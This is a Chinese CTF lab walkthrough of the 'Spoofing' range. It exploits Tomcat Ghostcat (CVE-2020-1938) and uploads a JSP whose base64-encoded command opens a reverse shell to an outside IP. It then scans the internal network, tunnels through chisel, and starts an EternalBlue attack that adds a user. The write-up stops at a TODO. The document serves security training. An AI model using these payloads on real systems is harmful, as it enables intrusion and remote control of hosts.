# Spoofing

Spoofing 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。

<!-- truncate -->

:::info

Tags

- Tomcat
- NTLM
- WebClient
- Coerce Authentication
- noPac

:::

```plaintext title="入口点"
39.98.127.153
```

## 入口点探测

照例，使用 fscan 进行扫描

```shell title="./tools/fscan_1.8.4/fscan -h 39.98.127.153"
start infoscan
39.98.127.153:22 open
39.98.127.153:8080 open
39.98.127.153:8009 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://39.98.127.153:8080 code:200 len:7091   title:后台管理
```

## 入口机 Port 8080 Tomcat 9.0.30

直接访问没有可交互点，都是静态资源

爆破目录 i，可以发现 Tomcat 的默认目录 `/examples` 和 `/docs`

通过 `/docs` 可以得知版本是 `9.0.30`

可以定位到 CVE-2020-1938 漏洞，影响范围涵盖 Tomcat 9.0.30

使用   [00theway/Ghostcat-CNVD-2020-10487: Ghostcat read file/code execute,CNVD-2020-10487(CVE-2020-1938)](https://github.com/00theway/Ghostcat-CNVD-2020-10487)   进行测试

```shell
┌──(randark㉿kali)-[~/exploit/Ghostcat-CNVD-2020-10487]
└─$ python3 ajpShooter.py http://39.98.127.153:8080 8009 /WEB-INF/web.xml read
       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"2489-1670857638305"
[<] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT
[<] Content-Type: application/xml
[<] Content-Length: 2489
```

```xml title="/WEB-INF/web.xml"
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>

  <security-constraint>
    <display-name>Tomcat Server Configuration Security Constraint</display-name>
    <web-resource-collection>
      <web-resource-name>Protected Area</web-resource-name>
      <url-pattern>/upload/*</url-pattern>
    </web-resource-collection>
    <auth-constraint>
      <role-name>admin</role-name>
    </auth-constraint>
  </security-constraint>

  <error-page>
    <error-code>404</error-code>
    <location>/404.html</location>
  </error-page>

  <error-page>
    <error-code>403</error-code>
    <location>/error.html</location>
  </error-page>

  <error-page>
    <exception-type>java.lang.Throwable</exception-type>
    <location>/error.html</location>
  </error-page>

  <servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>com.example.HelloServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/HelloServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>LoginServlet</display-name>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>com.example.LoginServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/LoginServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>RegisterServlet</display-name>
    <servlet-name>RegisterServlet</servlet-name>
    <servlet-class>com.example.RegisterServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>RegisterServlet</servlet-name>
    <url-pattern>/RegisterServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>UploadTestServlet</display-name>
    <servlet-name>UploadTestServlet</servlet-name>
    <servlet-class>com.example.UploadTestServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>UploadTestServlet</servlet-name>
    <url-pattern>/UploadServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>DownloadFileServlet</display-name>
    <servlet-name>DownloadFileServlet</servlet-name>
    <servlet-class>com.example.DownloadFileServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>DownloadFileServlet</servlet-name>
    <url-pattern>/DownloadServlet</url-pattern>
  </servlet-mapping>
</web-app>
```

可以看到定义了一个上传文件的 Servlet 功能，尝试进行利用

```plaintext
http://39.98.127.153:8080/UploadServlet
```

![img](img/image_20260427-152737.png)

生成一个反弹 shell 的 jsp 载荷

```java
<%
    java.io.InputStream payload = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEyOS4yOS4xODAvMTAwMDUgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream();
    int stat = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a = payload.read(b))!=-1){
        out.println(new String(b));
    }
%>
```

上传之后，返回的信息是

```plaintext
Files are stored in ./upload/2177dd304fe1c61debde8667681f76c8/20260404034500332.txt
```

但是没有办法直接访问这个目录，也就意味着还是需要漏洞来执行这个 jsp

```shell
python3 ajpShooter.py http://39.98.127.153:8080 8009 /upload/2177dd304fe1c61debde8667681f76c8/20260404034500332.txt eval
```

即可收到回连的 shell

```shell
(remote) root@ubuntu:/# whoami
root
```

## flag - 01

```shell
(remote) root@ubuntu:/# cat /root/flag/flag01.txt 
  ████████                             ████ ██                 
 ██░░░░░░  ██████                     ░██░ ░░            █████ 
░██       ░██░░░██  ██████   ██████  ██████ ██ ███████  ██░░░██
░█████████░██  ░██ ██░░░░██ ██░░░░██░░░██░ ░██░░██░░░██░██  ░██
░░░░░░░░██░██████ ░██   ░██░██   ░██  ░██  ░██ ░██  ░██░░██████
       ░██░██░░░  ░██   ░██░██   ░██  ░██  ░██ ░██  ░██ ░░░░░██
 ████████ ░██     ░░██████ ░░██████   ░██  ░██ ███  ░██  █████ 
░░░░░░░░  ░░       ░░░░░░   ░░░░░░    ░░   ░░ ░░░   ░░  ░░░░░  

This is the first flag you get.

flag01: flag{3dfc762c-dc13-4d92-9126-3f55093bd93e}
```

## 内网探测与代理枢纽

探测一下内网

```shell
(remote) root@ubuntu:/tmp# ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.11.76  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe1f:620  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:1f:06:20  txqueuelen 1000  (Ethernet)
        RX packets 83765  bytes 119065066 (119.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14288  bytes 1669534 (1.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 546  bytes 50521 (50.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 546  bytes 50521 (50.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

(remote) root@ubuntu:/tmp# ./fscan -h 172.22.11.0/24
......
[*] alive ports len is: 14
start vulscan
[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          
[*] NetInfo 
[*]172.22.11.6
   [->]XIAORANG-DC
   [->]172.22.11.6
[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    
[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理
[*] NetInfo 
[*]172.22.11.26
   [->]XR-LCM3AE8B
   [->]172.22.11.26
已完成 14/14
[*] 扫描结束,耗时: 8.344644696s
```

|      IP      |         Hostname        |     Note     |
| :----------: | :---------------------: | :----------: |
| 172.22.11.26 |       XR-LCM3AE8B       |              |
|  172.22.11.6 |       XIAORANG-DC       |              |
| 172.22.11.45 | XR-DESKTOP.xiaorang.lab |   MS17-010   |
| 172.22.11.76 |                         | Linux  Entry |

搭建一个 socks 代理

```shell
(remote) root@ubuntu:/tmp# ./chisel_1.10.1_linux_amd64 client 8.129.29.180:10000 R:0.0.0.0:10001:socks
2026/04/04 15:52:53 client: Connecting to ws://8.129.29.180:10000
2026/04/04 15:52:54 client: Connected (Latency 42.376463ms)
```

## 172.22.11.45 MS17-010

直接用 Metasploit 来打

```shell
msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 172.22.11.45
rhosts => 172.22.11.45
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/exec 
payload => windows/x64/exec
msf exploit(windows/smb/ms17_010_eternalblue) > set CMD net user randark Admin123### /add
CMD => net user randark Admin123### /add
```

TODO 待补充
